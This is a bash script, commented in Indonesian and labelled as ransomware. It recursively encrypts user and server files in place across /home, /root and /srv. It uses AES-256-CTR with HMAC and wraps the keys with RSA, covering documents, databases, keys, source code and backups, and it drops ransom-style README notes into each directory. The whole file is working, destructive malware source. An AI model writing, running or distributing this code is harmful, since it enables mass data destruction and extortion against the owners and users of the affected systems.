#!/bin/bash
# lock.sh — enkripsi ransomeware. root. idempoten (header HXN1).
set -u
ROOTS=${HXN_ROOTS:-/home:/root:/srv}
WORK=${HXN_WORK:-/usr/lib/.hxn}
JOBS=${JOBS:-8}
EXT=" txt log conf ini yml yaml json xml csv sql db pdf doc docx jpg png zip tar gz bak php py js key pem "
HDR=HXN1
umask 077

[ "$(id -u)" = 0 ] || echo "[!] bukan root, sebagian file akan gagal"
mkdir -p "$WORK" || exit 1
cd "$WORK" || exit 1

# --- keypair sekali saja ---
if [ ! -f ransom_priv.pem ]; then
  openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out ransom_priv.pem 2>/dev/null || exit 1
  openssl pkey -in ransom_priv.pem -pubout -out pub.pem 2>/dev/null || exit 1
  chmod 600 ransom_priv.pem
fi

hex(){ od -An -v -tx1 "$1" | tr -d ' \n'; }
enc=0
: > .count

enc_one(){
  local f=$1 t ek ct l
  [ -f "$f" ] && [ ! -L "$f" ] && [ -s "$f" ] || return 0
  [ "$(head -c4 -- "$f" 2>/dev/null)" = "$HDR" ] && return 0
  [ -w "$f" ] || return 0
  t=$(mktemp -d "$WORK/.t.XXXXXX") || return 0

  openssl rand 32 > "$t/k"; openssl rand 32 > "$t/m"; openssl rand 16 > "$t/iv"
  cat "$t/k" "$t/m" > "$t/blob"
  openssl pkeyutl -encrypt -pubin -inkey pub.pem \
    -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256 \
    -in "$t/blob" -out "$t/ek" 2>/dev/null || { rm -rf "$t"; return 0; }
  openssl enc -aes-256-ctr -K "$(hex "$t/k")" -iv "$(hex "$t/iv")" \
    -in "$f" -out "$t/ct" 2>/dev/null || { rm -rf "$t"; return 0; }

  cat "$t/iv" "$t/ct" | openssl dgst -sha256 -hmac "$(hex "$t/m")" -binary > "$t/mac" 2>/dev/null \
    || openssl dgst -sha256 -mac HMAC -macopt "hexkey:$(hex "$t/m")" -binary < <(cat "$t/iv" "$t/ct") > "$t/mac"

  l=$(stat -c%s "$t/ek")
  { printf '%s' "$HDR"
    printf '%b' "$(printf '\\x%02x\\x%02x' $((l>>8)) $((l&255)))"
    cat "$t/ek" "$t/mac" "$t/iv" "$t/ct"; } > "$f.hxn" && mv -f "$f.hxn" "$f"
  echo x >> .count
  rm -rf "$t"
}

for r in ${ROOTS//:/ }; do
  [ -d "$r" ] || continue
  while IFS= read -r -d '' f; do
    e=${f##*.}; e=${e,,}
    case "$EXT" in *" $e "*) ;; *) continue ;; esac
    if (( BASH_VERSINFO[0]>4 || (BASH_VERSINFO[0]==4 && BASH_VERSINFO[1]>=3) )); then
      enc_one "$f" & 
      while [ "$(jobs -rp | wc -l)" -ge "$JOBS" ]; do wait -n; done
    else
      enc_one "$f"
    fi
  done < <(find "$r" -type d -name '.*' -prune -o -type f -print0 2>/dev/null)
done
wait
enc=$(wc -l < .count); rm -f .count

msg="=== HXN ===
$enc file terenkripsi AES-256-CTR + HMAC-SHA256, kunci dibungkus RSA-2048-OAEP.
Kunci: $WORK/ransom_priv.pem
ID: $(openssl rand -hex 8)"
for r in ${ROOTS//:/ }; do
  [ -d "$r" ] && printf '%s\n' "$msg" > "$r/README_HXN.txt" 2>/dev/null
done
echo "[lock] $enc file"